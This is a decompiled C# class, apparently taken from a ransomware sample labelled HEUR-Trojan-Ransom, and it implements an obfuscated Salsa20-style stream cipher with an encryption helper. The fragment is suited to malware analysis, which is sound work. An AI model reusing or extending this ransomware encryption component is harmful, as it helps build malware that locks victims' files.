// Decompiled with JetBrains decompiler
// Type: xQrQRQddRE.rkaJvaLxSApP
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace xQrQRQddRE
{
  public sealed class rkaJvaLxSApP : SymmetricAlgorithm
  {
    private int HjRQodbgvPG;

    public static byte[] XSSYjgejGHjLCQ([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray1 = obj1;
      byte[] numArray2 = obj2;
      using (rkaJvaLxSApP rkaJvaLxSapP = new rkaJvaLxSApP())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          rkaJvaLxSapP.Key = numArray1;
          rkaJvaLxSapP.IV = numArray2;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rkaJvaLxSapP.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = obj0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public rkaJvaLxSApP()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.HjRQodbgvPG = 20;
    }

    [SpecialName]
    public override byte[] get_IV() => base.IV;

    [SpecialName]
    public override void set_IV([In] byte[] obj0)
    {
      rkaJvaLxSApP.ZFYFkQbbdrtOpLRH(obj0, "value");
      this.IVValue = (byte[]) obj0.Clone();
    }

    public override ICryptoTransform CreateDecryptor([In] byte[] obj0, [In] byte[] obj1) => this.CreateEncryptor(obj0, obj1);

    public override ICryptoTransform CreateEncryptor([In] byte[] obj0, [In] byte[] obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException("rgbKey");
      if (!this.ValidKeySize(obj0.Length * 8))
        throw new CryptographicException("Invalid key size; it must be 128 or 256 bits.");
      rkaJvaLxSApP.ZFYFkQbbdrtOpLRH(obj1, "rgbIV");
      return (ICryptoTransform) new rkaJvaLxSApP.rVzNpEatoZVHUi(obj0, obj1, this.HjRQodbgvPG);
    }

    public override void GenerateIV() => this.IVValue = rkaJvaLxSApP.zcWFCPSonHJ(8);

    public override void GenerateKey() => this.KeyValue = rkaJvaLxSApP.zcWFCPSonHJ(this.KeySize / 8);

    private static void ZFYFkQbbdrtOpLRH([In] byte[] obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
      if (obj0.Length != 8)
        throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
    }

    private static byte[] zcWFCPSonHJ([In] int obj0)
    {
      byte[] data = new byte[obj0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    private sealed class rVzNpEatoZVHUi : ICryptoTransform, IDisposable
    {
      private static readonly byte[] yzdUoJLGCvaBH = Encoding.ASCII.GetBytes("expand 32-byte k");
      private static readonly byte[] GluSOqaJxIDuL = Encoding.ASCII.GetBytes("expand 16-byte k");
      private readonly int HjRQodbgvPG;
      private uint[] ePGLAGELowNuV;

      public rVzNpEatoZVHUi([In] byte[] obj0, [In] byte[] obj1, [In] int obj2)
      {
        this.Initialize(obj0, obj1);
        this.HjRQodbgvPG = obj2;
      }

      [SpecialName]
      public bool get_CanReuseTransform() => false;

      [SpecialName]
      public bool get_CanTransformMultipleBlocks() => true;

      [SpecialName]
      public int get_InputBlockSize() => 64;

      [SpecialName]
      public int get_OutputBlockSize() => 64;

      public int TransformBlock([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] byte[] obj3, [In] int obj4)
      {
        if (obj0 == null)
          throw new ArgumentNullException("inputBuffer");
        if (obj1 < 0 || obj1 >= obj0.Length)
          throw new ArgumentOutOfRangeException("inputOffset");
        if (obj2 < 0 || obj1 + obj2 > obj0.Length)
          throw new ArgumentOutOfRangeException("inputCount");
        if (obj3 == null)
          throw new ArgumentNullException("outputBuffer");
        if (obj4 < 0 || obj4 + obj2 > obj3.Length)
          throw new ArgumentOutOfRangeException("outputOffset");
        if (this.ePGLAGELowNuV == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] numArray = new byte[64];
        int num1 = 0;
        while (obj2 > 0)
        {
          this.Hash(numArray, this.ePGLAGELowNuV);
          this.ePGLAGELowNuV[8] = rkaJvaLxSApP.rVzNpEatoZVHUi.AddOne(this.ePGLAGELowNuV[8]);
          if (this.ePGLAGELowNuV[8] == 0U)
            this.ePGLAGELowNuV[9] = rkaJvaLxSApP.rVzNpEatoZVHUi.AddOne(this.ePGLAGELowNuV[9]);
          int num2 = Math.Min(64, obj2);
          for (int index = 0; index < num2; ++index)
            obj3[obj4 + index] = (byte) ((uint) obj0[obj1 + index] ^ (uint) numArray[index]);
          num1 += num2;
          obj2 -= 64;
          obj4 += 64;
          obj1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        byte[] numArray = obj2 >= 0 ? new byte[obj2] : throw new ArgumentOutOfRangeException("inputCount");
        this.TransformBlock(obj0, obj1, obj2, numArray, 0);
        return numArray;
      }

      public void Dispose()
      {
        if (this.ePGLAGELowNuV != null)
          Array.Clear((Array) this.ePGLAGELowNuV, 0, this.ePGLAGELowNuV.Length);
        this.ePGLAGELowNuV = (uint[]) null;
      }

      private static uint Rotate([In] uint obj0, [In] int obj1) => obj0 << obj1 | obj0 >> 32 - obj1;

      private static uint Add([In] uint obj0, [In] uint obj1) => obj0 + obj1;

      private static uint AddOne([In] uint obj0) => obj0 + 1U;

      private void Hash([In] byte[] obj0, [In] uint[] obj1)
      {
        uint[] numArray = (uint[]) obj1.Clone();
        for (int hjRqodbgvPg = this.HjRQodbgvPG; hjRqodbgvPg > 0; hjRqodbgvPg -= 2)
        {
          numArray[4] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= rkaJvaLxSApP.rVzNpEatoZVHUi.Rotate(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          rkaJvaLxSApP.rVzNpEatoZVHUi.ToBytes(rkaJvaLxSApP.rVzNpEatoZVHUi.Add(numArray[index], obj1[index]), obj0, 4 * index);
      }

      private void Initialize([In] byte[] obj0, [In] byte[] obj1)
      {
        this.ePGLAGELowNuV = new uint[16];
        this.ePGLAGELowNuV[1] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, 0);
        this.ePGLAGELowNuV[2] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, 4);
        this.ePGLAGELowNuV[3] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, 8);
        this.ePGLAGELowNuV[4] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, 12);
        byte[] numArray = obj0.Length == 32 ? rkaJvaLxSApP.rVzNpEatoZVHUi.yzdUoJLGCvaBH : rkaJvaLxSApP.rVzNpEatoZVHUi.GluSOqaJxIDuL;
        int num = obj0.Length - 16;
        this.ePGLAGELowNuV[11] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, num);
        this.ePGLAGELowNuV[12] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, num + 4);
        this.ePGLAGELowNuV[13] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, num + 8);
        this.ePGLAGELowNuV[14] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj0, num + 12);
        this.ePGLAGELowNuV[0] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(numArray, 0);
        this.ePGLAGELowNuV[5] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(numArray, 4);
        this.ePGLAGELowNuV[10] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(numArray, 8);
        this.ePGLAGELowNuV[15] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(numArray, 12);
        this.ePGLAGELowNuV[6] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj1, 0);
        this.ePGLAGELowNuV[7] = rkaJvaLxSApP.rVzNpEatoZVHUi.ToUInt32(obj1, 4);
        this.ePGLAGELowNuV[8] = 0U;
        this.ePGLAGELowNuV[9] = 0U;
      }

      private static uint ToUInt32([In] byte[] obj0, [In] int obj1) => (uint) ((int) obj0[obj1] | (int) obj0[obj1 + 1] << 8 | (int) obj0[obj1 + 2] << 16 | (int) obj0[obj1 + 3] << 24);

      private static void ToBytes([In] uint obj0, [In] byte[] obj1, [In] int obj2)
      {
        obj1[obj2] = (byte) obj0;
        obj1[obj2 + 1] = (byte) (obj0 >> 8);
        obj1[obj2 + 2] = (byte) (obj0 >> 16);
        obj1[obj2 + 3] = (byte) (obj0 >> 24);
      }
    }
  }
}
